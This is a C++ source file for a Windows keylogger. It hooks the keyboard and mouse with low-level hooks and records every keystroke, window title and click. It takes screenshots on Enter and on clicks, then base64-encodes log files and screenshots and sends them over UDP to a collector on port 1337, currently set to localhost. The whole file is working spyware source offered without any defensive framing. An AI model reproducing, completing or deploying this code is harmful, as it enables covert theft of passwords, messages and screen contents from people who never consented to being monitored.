#include "pch.h"
#include <iostream>
#include <string>
#include <ctime>
#include <WS2tcpip.h>
#include <fstream>
#include <vector>
#include <sstream>
#include "wtypes.h"
#include <Windows.h>
#include <iomanip>
#include <chrono>
#include <gdiplus.h>
#include <thread>
#include <cstdio>
#include <direct.h>
#include "sha512.hh"
#include <complex>

#pragma comment (lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma warning( disable : 4267)
#pragma warning( disable : 4996)

using namespace std;
using namespace Gdiplus;
using namespace sw;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParan);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
HHOOK mouse_hook;
HHOOK keyboard_hook;
HWND prev_window;
POINT fmouse_pos;
POINT smouse_pos;
SOCKET outgoing_socket;
sockaddr_in socket_address;
WSADATA wsa_data;
WORD wsa_version;

ofstream logfile;

long file_position;
int clks_per_log = 5; // this needs to go up 400-5000
int chars_per_log = 100;
int screen_width = 1920;
int screen_height = 1080;
int press_counter = 0;
int save_screenshot(string filename, ULONG uQuality);

char title_buffer[1024];
char hostname_buffer[256];
static const string base64_characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" "abcdefghijklmnopqrstuvwxyz" "0123456789+/";

vector<string> screen_shots;

string logfilename;
string screenshot_path;
string current_time();
string encode64(string filename);
string base64_decode(std::string const& encoded_string);
string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len);

void count_secs(int duration);
void send_screenshots(vector<string> path_vector);
void decode64(string b64, string output);
void start_socket(SOCKET &out = outgoing_socket, SOCKADDR_IN &server = socket_address, WORD &version = wsa_version, WSADATA &data = wsa_data, int port = 1337);
void send_text(string data, SOCKET out = outgoing_socket, SOCKADDR_IN server = socket_address);
void send_file(string filename, SOCKET out = outgoing_socket, SOCKADDR_IN server = socket_address);
void print_vector(vector<string> v);
template <typename Stream>
void new_log(string pFile, Stream& pStream);

//TODO: fix with get key-state aka GetKeyState(key)
bool shift = false;
bool control = false;
bool windows = false;
// -- -- -- -- -- --
bool file_exist(string filename);
static inline bool is_base64(unsigned char c);

int main()
{
	locale swedish("swedish");
	locale::global(swedish);
	start_socket();
	send_file("kyss.txt");
	count_secs(40);
	getchar();
	gethostname(hostname_buffer, 256);
	stringstream logname_stream;
	logname_stream << R"(LongTerm_)" << hostname_buffer << "_keyboard_" << current_time() + ".log";
	_mkdir(hostname_buffer);
	stringstream directory_stream;
	directory_stream << hostname_buffer << "\\" << "Screens";
	screenshot_path = directory_stream.str();
	_mkdir(directory_stream.str().c_str());
	logfilename = logname_stream.str();
	logfile.open(logname_stream.str());
	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, 0, 0);
	cout << "Hooking the keyboard" << endl;
	cout << "Hook: " << keyboard_hook << endl;
	shift = (GetKeyState(VK_CAPITAL)) != 0;
	MSG wm_msg{ nullptr };
	while (GetMessage(&wm_msg, nullptr, 0, 0) != 0); //returns 0 when WM_QUIT gets called
	UnhookWindowsHookEx(keyboard_hook);
	UnhookWindowsHookEx(mouse_hook);
	logfile.close();
	closesocket(outgoing_socket);
	WSACleanup();
	return 0;
}

void count_secs(int duration) {
	const clock_t begin_time = clock();
	int p_time = 0;
	for (;;) {
		int time_passed = (clock() - begin_time / CLOCKS_PER_SEC) / 1000; //seconds passed
		if (time_passed != p_time) {
			cout << time_passed << endl;
			p_time = time_passed;
			if (time_passed >= 30) { //seconds to count as inactive ex(5 min)
				
			}
		}
	}
}

template <typename Stream>
void new_log(string target_filename, Stream& target_stream)
{
	target_stream.close();
	target_stream.clear();
	target_stream.open(target_filename);
}

void start_socket(SOCKET &outgoing_Socket, SOCKADDR_IN &socket_Address, WORD &wsa_Version, WSADATA &wsa_Data, int port)
{
	wsa_Version = MAKEWORD(2, 2);
	const auto wsOk = WSAStartup(wsa_Version, &wsa_Data);
	if (wsOk == 0)
	{
		outgoing_Socket = socket(AF_INET, SOCK_DGRAM, 0);
		socket_Address.sin_family = AF_INET;
		socket_Address.sin_port = htons(port);
		inet_pton(AF_INET, "127.0.0.1", &socket_Address.sin_addr);
		return;
	}
	cout << "Can't start Winsock! " << wsOk;
}

void send_screenshots(vector<string> path_vector) {
	for (auto i = path_vector.begin(); i != path_vector.end(); ++i) {
		string filnamn = *i;
		send_file(filnamn);
	}
	screen_shots.clear();
}

bool file_exist(string filename) {
	ifstream input_file(filename);
	return input_file.good();
}

static inline bool is_base64(unsigned char target_char) {
	return (isalnum(target_char) || (target_char == '+') || (target_char == '/'));
}

void send_text(string input_text, SOCKET outgoing_socket, SOCKADDR_IN socket_address) {
	string data_size = to_string(input_text.length());
	string data_type = "TEXT";
	auto send_Type = sendto(outgoing_socket, data_type.c_str(),  data_type.size() + 1,  0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
	auto send_Size = sendto(outgoing_socket, data_size.c_str(),  data_size.size() + 1,  0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
	auto send_Text = sendto(outgoing_socket, input_text.c_str(), input_text.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
	if (send_Type == SOCKET_ERROR || send_Text == SOCKET_ERROR || send_Size == SOCKET_ERROR)
	{
		cout << "Error: " << WSAGetLastError() << endl;
	}
}

void send_file(string filename, SOCKET outgoing_socket, SOCKADDR_IN socket_address) {
	if (file_exist(filename)) {
		cout << "File: " << filename << " -> ";
	}
	else {
		cout << "File: \"" << filename << "\" does not exist!" << endl;
		return;
	}
	const clock_t begin_time = clock();
	cout << "Encoding File ";
	string base64_string = encode64(filename);
	const int encode_length = base64_string.length();
	if (encode_length >= 60000) // since 60kb is some sort of UDP packet limit
	{
		string data_Type = "FILE";
		cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
		auto split_count = 0;
		cout << "| Size: ";
		auto divisor_count = 1;
		while (divisor_count <= encode_length) {
			if (encode_length / divisor_count <= 60000 && encode_length % divisor_count == 0)
			{
				cout << divisor_count << " * " << (encode_length / divisor_count) << " = " << divisor_count * (encode_length / divisor_count);
				split_count = divisor_count;
				break;
			}
			divisor_count++;
		}

		vector<string> datafile;
		for (auto i = 0; i < base64_string.length(); i += (encode_length / split_count)) {
			datafile.push_back(base64_string.substr(i, (encode_length / split_count)));
		}

		string size_split = to_string((encode_length / split_count));
		string amount_split = to_string(split_count);

		auto send_Type =           sendto(outgoing_socket, data_Type.c_str(), data_Type.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // type
		auto send_Filename =       sendto(outgoing_socket, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // filename
		auto send_SHA512Hash =	   sendto(outgoing_socket, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // hash
		auto send_SplitSize =	   sendto(outgoing_socket, size_split.c_str(), size_split.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // per split size
		auto send_NumberOfSplits = sendto(outgoing_socket, amount_split.c_str(), amount_split.size(), 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address)); // # of splits
		
		if(send_Type == SOCKET_ERROR) {
			cout << "Send Type Error: " << WSAGetLastError() << endl;
		}else if (send_Filename == SOCKET_ERROR) {
			cout << "Send Filename Error: " << WSAGetLastError() << endl;
		}else if (send_SHA512Hash == SOCKET_ERROR) {
			cout << "Send Hash Error: " << WSAGetLastError() << endl;
		}else if (send_SplitSize == SOCKET_ERROR) {
			cout << "Send Split Size Error: " << WSAGetLastError() << endl;
		}else if (send_NumberOfSplits == SOCKET_ERROR) {
			cout << "Send Number of splits Error: " << WSAGetLastError() << endl;
		}

		for (auto i = datafile.begin(); i != datafile.end(); ++i) {
			string split_chunk = *i;
			Sleep(50);
			const int send_Chunk = sendto(outgoing_socket, split_chunk.c_str(), stoi(size_split), 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
			if (send_Chunk == SOCKET_ERROR) {
				cout << "Send Chunk Error: " << WSAGetLastError() << endl;
			}
		}

		cout << " | <Sent File>" << endl << endl;

	}
	else //less than 60000 
	{
		string data_type = "SMALLFILE";
		cout << "Took " << float(clock() - begin_time) / CLOCKS_PER_SEC << "s ";
		int send_Type = sendto(outgoing_socket, data_type.c_str(), data_type.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
		if (send_Type == SOCKET_ERROR) {
			cout << "Send Type Error: " << WSAGetLastError() << endl;
		}
		int send_Filename = sendto(outgoing_socket, filename.c_str(), filename.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
		if (send_Filename == SOCKET_ERROR) {
			cout << "Send Filename Error: " << WSAGetLastError() << endl;
		}
		int send_SHA512Hash = sendto(outgoing_socket, sha512::file(filename).c_str(), sha512::file(filename).size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
		if (send_SHA512Hash == SOCKET_ERROR) {
			cout << "Send SHA512 Error: " << WSAGetLastError() << endl;
		}
		int send_Filesize = sendto(outgoing_socket, to_string(encode_length).c_str(), to_string(encode_length).size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
		if (send_Filesize == SOCKET_ERROR) {
			cout << "Send Filesize Error: " << WSAGetLastError() << endl;
		}
		int send_StringBase64 = sendto(outgoing_socket, base64_string.c_str(), base64_string.size() + 1, 0, reinterpret_cast<sockaddr*>(&socket_address), sizeof(socket_address));
		if (send_StringBase64 == SOCKET_ERROR) {
			cout << "Send base64 String Error: " << WSAGetLastError() << endl;
		}
		cout << " | <Sent File>" << endl << endl;
	}
}

//TODO: fix ints with virtual-Key codes -> https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	const HWND fwindow = GetForegroundWindow();
	const auto key = PKBDLLHOOKSTRUCT(lParam);
	#pragma region Key Down
	if (wParam == WM_KEYDOWN && nCode == HC_ACTION) { // key has been pressed
		if (prev_window != fwindow) { // prints the window name only if the user has began typing in a new window
			wchar_t wtitle[1024];
			mbstowcs(wtitle, title_buffer, strlen(title_buffer) + 1);
			const auto old_title = wtitle;
			//SetWindowText(prev_window, old_title);
			GetWindowTextA(fwindow, title_buffer, 1024);
			stringstream title_stream;
			title_stream << "(" << current_time() << ") Title->[" << title_buffer << "]" << endl;
			send_text(title_stream.str());
			cout << "\n[" << current_time() << "] " << "Title: \"" << title_buffer << "\"" << endl;
			logfile << "\n[" << current_time() << "] " << "Title: \"" << title_buffer << "\"" << endl;
			stringstream temp_title, hhookstream;
			hhookstream << keyboard_hook;
			temp_title << title_buffer << " (H:\"" << hhookstream.str().substr(0,2) << ""<< hhookstream.str().substr(3, 3) <<hhookstream.str().substr(7, 7)<< "\")"; //some scary shit that works
			wchar_t hook_title[1024];
			mbstowcs(hook_title, temp_title.str().c_str(), temp_title.str().length() + 1);
			SetWindowText(fwindow, hook_title); //LPCWSTR needs to have L as prefix to assign a string to it
			prev_window = fwindow;
		}
		//Send Log every (chrperlog) key presses
		if (press_counter <= chars_per_log)
		{
			press_counter++;
		}
		else
		{
			press_counter = 0; //reset
			send_file(logfilename);
			stringstream sd;
			sd << R"(LongTerm_)" << hostname_buffer << "_keyboard_" << current_time() + ".log";
			new_log(sd.str(), logfile);
			logfilename = sd.str();
			cout << endl << logfilename << "is the new log file" << endl;
			//TODO: SEND LOG & CREATE NEW LOG after the user has typed (chrperlog) amount of chars
		}
		const auto current_key = int(key->vkCode);
		switch (current_key) {
		case 8: //backspace
		{
			send_text("[BS]");
			cout << "\b \b";
			file_position = logfile.tellp();
			logfile.seekp(file_position - 1);
			logfile.write("", 1);
			file_position = logfile.tellp();
			logfile.seekp(file_position - 1);
			break;
		}
		case 9: //tab
			send_text("    ");
			cout << "    ";
			logfile << "    ";
			break;
		case 13:
		{
			send_text(" [ENTER] ");
			cout << " [ENTER]\n";
			logfile << " [ENTER]\n";
			string filename = screenshot_path + "\\" + current_time() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			screen_shots.push_back(filename);
			break;
		}
		case 32: //space-bar
			send_text(" ");
			cout << " ";
			logfile << " ";
			break;
		case 20:
			shift = !shift;
			break;
		case 162: //ctrl
		case 163:
			control = true;
			break;
		case 91: //win-key
			windows = true;
			break;
		case 160: //shift
		case 161:
			shift = !shift;
			break;
		case 190:
			send_text(".");
			cout << ".";
			logfile << ".";
			break;
		case 187:
			send_text("?");
			cout << "?";
			logfile << "?";
			break;
		case 188:
			send_text(",");
			cout << ",";
			logfile << ",";
			break;
		case 189:
			send_text("-");
			cout << "-";
			logfile << "-";
			break;
		case 221:
			send_text("å");
			cout << "å";
			logfile << "å";
			break;
		case 222:
			send_text("ä");
			cout << "ä";
			logfile << "ä";
			break;
		case 192:
			send_text("ö");
			cout << "ö";
			logfile << "ö";
			break;
		default:
			if (windows && (current_key >= 65 && current_key <= 90)) {
				send_text(" WIN-[" + string(1, current_key) + "] ");
				cout << " WIN-[" << char(current_key) << "] \n";
				logfile << " WIN-[" << char(current_key) << "] \n";
				break;
			}
			if (control && (current_key >= 65 && current_key <= 90)) { // if control is pressed and the other key is (A - Z)
				cout << " CTRL-[" << char(current_key) << "] ";
				send_text(" CTRL-[" + string(1, current_key) + "]");
				logfile << " CTRL-[" << char(current_key) << "] ";
				break;
			}
			if (!shift && (current_key >= 65 && current_key <= 90)) { // (A - Z)
				send_text(string(1, current_key + 32));
				cout << char(current_key + 32);
				logfile << char(current_key + 32);
				break;
			}
			if (shift && (current_key >= 65 && current_key <= 90)) { // (A - Z) shifted
				send_text(string(1, current_key));
				cout << char(current_key);
				logfile << char(current_key);
				break;
			}
			if (shift && (current_key >= 48 && current_key <= 57)) { // shifted numbered
				if (current_key == 48) {
					send_text(string(1, current_key + 13));
					cout << char(current_key + 13);
					logfile << char(current_key + 13);
				}
				else {
					send_text(string(1, current_key - 16));
					cout << char(current_key - 16);
					logfile << char(current_key - 16);
				}
			}
			else if ((current_key >= 48 && current_key <= 57)) { // numbers
				send_text(string(1, current_key));
				cout << char(current_key);
				logfile << char(current_key);
				break;
			}
			else {
				stringstream ss;
				ss << " -UKN[0x" << hex << current_key << "]- ";
				send_text(ss.str());
				cout << int(current_key);
				break;
			}
			break;
		}
	}
#pragma endregion
	#pragma region Key Up
	if (wParam == WM_KEYUP && nCode == HC_ACTION) {
		const auto current_key = int(key->vkCode);
		switch (current_key) {
		case 91:
			windows = false;
			break;
		case 160:
		case 161:
			shift = !shift;
			break;
		case 162:
		case 163:
			control = false;
			break;
		default:;
		}
	}
#pragma endregion
	return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	#pragma region Mouse Up
	if (wParam == 514) {
		GetCursorPos(&fmouse_pos);
		cout << "[lU]: {X=" << fmouse_pos.x << ", Y=" << fmouse_pos.y << "}, ";
		cout << "[Dr]: {X=" << smouse_pos.x - fmouse_pos.x << ", Y=" << smouse_pos.y - fmouse_pos.y << "}";
		logfile << "[U]: {X=" << fmouse_pos.x << ", Y=" << fmouse_pos.y << "}, ";
		logfile << "[Dr]: {X=" << smouse_pos.x - fmouse_pos.x << ", Y=" << smouse_pos.y - fmouse_pos.y << "}";

		if (abs(smouse_pos.x - fmouse_pos.x) <= 2 && abs(smouse_pos.y - fmouse_pos.y) <= 2) {
			string filename = current_time() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			screen_shots.push_back(filename);
			cout << " [ CLICK ] " << endl;
			logfile << " [ CLICK ] " << "[" << filename << "]" << endl;
		}
		else {
			string filename = current_time() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			screen_shots.push_back(filename);
			cout << " [ DRAG ] " << endl;
			logfile << " [ DRAG ] " << "[" << filename << "]" << endl;
		}
	}
	else if (wParam == 517) {
		GetCursorPos(&fmouse_pos);

		cout << "[rU]: {X=" << fmouse_pos.x << ", Y=" << fmouse_pos.y << "}, ";
		cout << "[Dr]: {X=" << smouse_pos.x - fmouse_pos.x << ", Y=" << smouse_pos.y - fmouse_pos.y << "}";
		logfile << "[U]: {X=" << fmouse_pos.x << ", Y=" << fmouse_pos.y << "}, ";
		logfile << "[Dr]: {X=" << smouse_pos.x - fmouse_pos.x << ", Y=" << smouse_pos.y - fmouse_pos.y << "}";

		if (abs(smouse_pos.x - fmouse_pos.x) <= 2 && abs(smouse_pos.y - fmouse_pos.y) <= 2) {
			string filename = current_time() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			screen_shots.push_back(filename);
			cout << " [ RCLICK ] " << endl;
			logfile << " [ RCLICK ] [" << filename << "]" << endl;
		}
		else {//screenshot_path + "_" +
			string filename =  current_time() + ".jpg";
			thread sc(save_screenshot, filename, 1);
			sc.detach();
			screen_shots.push_back(filename);
			cout << " [ RDRAG ] " << endl;
			logfile << " [ RDRAG ] " << "[" << filename << "]" << endl;
		}
	}
#pragma endregion

	#pragma region Mouse Down
	else if (wParam == 513) {
		if (screen_shots.size() >= clks_per_log)
		{
			thread st(send_screenshots,screen_shots);
			st.detach();
		}
		GetCursorPos(&smouse_pos);
		cout << endl << "[" << current_time() << "] ML[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
		logfile << endl << "[" << current_time() << "] Left Mouse[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
	}
	else if (wParam == 516) {
		if (screen_shots.size() >= clks_per_log)
		{
			cout << clks_per_log << "times has the mouse been clicked";
		}
		GetCursorPos(&smouse_pos);
		cout << endl << "[" << current_time() << "] MR[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
		logfile << endl << "[" << current_time() << "] Right Mouse[D]: {X=" << smouse_pos.x << ", Y=" << smouse_pos.y << "}, ";
	}
#pragma endregion
	return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

string current_time() {
	std::time_t t = std::time(nullptr);
	std::tm tm = *std::localtime(&t);
	stringstream ff;
	ff << std::put_time(&tm, "%Y-%m-%d-%H.%M.%S");
	return ff.str();
}

int GetEncoderClsid(WCHAR *format, CLSID *pClsid)
{
	unsigned int num = 0, size = 0;
	GetImageEncodersSize(&num, &size);
	if (size == 0) return -1;
	ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)(malloc(size));
	if (pImageCodecInfo == NULL) return -1;
	GetImageEncoders(num, size, pImageCodecInfo);

	for (unsigned int j = 0; j < num; ++j) {
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return -1;
}

int save_screenshot(string filename, ULONG uQuality)
{
	ULONG_PTR gdiplusToken;
	GdiplusStartupInput gdiplus_startup_input;
	GdiplusStartup(&gdiplusToken, &gdiplus_startup_input, nullptr);
	const auto hMyWnd = GetDesktopWindow();
	RECT r;
	HDC dc, hdcCapture;
	int n_bpp;
	LPBYTE lpCapture;
	CLSID imageCLSID;
	GetWindowRect(hMyWnd, &r);
	dc = GetWindowDC(hMyWnd);
	n_bpp = GetDeviceCaps(dc, BITSPIXEL);
	hdcCapture = CreateCompatibleDC(dc);
	BITMAPINFO bmiCapture = { sizeof(BITMAPINFOHEADER), screen_width, -screen_height, 1, n_bpp, BI_RGB, 0, 0, 0, 0, 0, };
	HBITMAP hbmCapture = CreateDIBSection(dc, &bmiCapture, DIB_PAL_COLORS, reinterpret_cast<LPVOID *>(&lpCapture), nullptr, 0);
	if (!hbmCapture) {
		DeleteDC(hdcCapture);
		DeleteDC(dc);
		GdiplusShutdown(gdiplusToken);
		printf("failed to take the screenshot. err: %d\n", GetLastError());
		return 0;
	}
	const int n_capture = SaveDC(hdcCapture);
	SelectObject(hdcCapture, hbmCapture);
	BitBlt(hdcCapture, 0, 0, screen_width, screen_height, dc, 0, 0, SRCCOPY);
	RestoreDC(hdcCapture, n_capture);
	DeleteDC(hdcCapture);
	DeleteDC(dc);
	auto p_screen_shot = new Bitmap(hbmCapture, static_cast<HPALETTE>(nullptr));
	EncoderParameters encoderParams{};
	encoderParams.Count = 1;
	encoderParams.Parameter[0].NumberOfValues = 1;
	encoderParams.Parameter[0].Guid = EncoderQuality;
	encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
	encoderParams.Parameter[0].Value = &uQuality;
	GetEncoderClsid((WCHAR*)(L"image/png"), &imageCLSID);
	const auto lpsz_filename = new wchar_t[filename.length() + 1];
	mbstowcs(lpsz_filename, filename.c_str(), filename.length() + 1);
	const int i_res = (p_screen_shot->Save(lpsz_filename, &imageCLSID, &encoderParams) == Ok);
	delete p_screen_shot;
	DeleteObject(hbmCapture);
	GdiplusShutdown(gdiplusToken);
	return i_res;
}

string base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	auto i = 0;
	auto j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i < 4); i++)
				ret += base64_characters[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_characters[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';
	}

	return ret;
}

string base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_characters.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_characters.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}

	return ret;
}

string encode64(string filename) {
	ifstream fin(filename, ios::binary);
	ostringstream ostring;
	ostring << fin.rdbuf();
	string dout = ostring.str();
	return base64_encode((const unsigned char *)dout.c_str(), dout.length());
}

void decode64(string b64, string output) {
	ofstream fout(output, ios::binary);
	string ofb64 = base64_decode(b64);
	fout << ofb64;
}

void print_vector(vector<string> v) {
	for (auto i = v.begin(); i != v.end(); ++i) {
		cout << *i << endl;
	}
}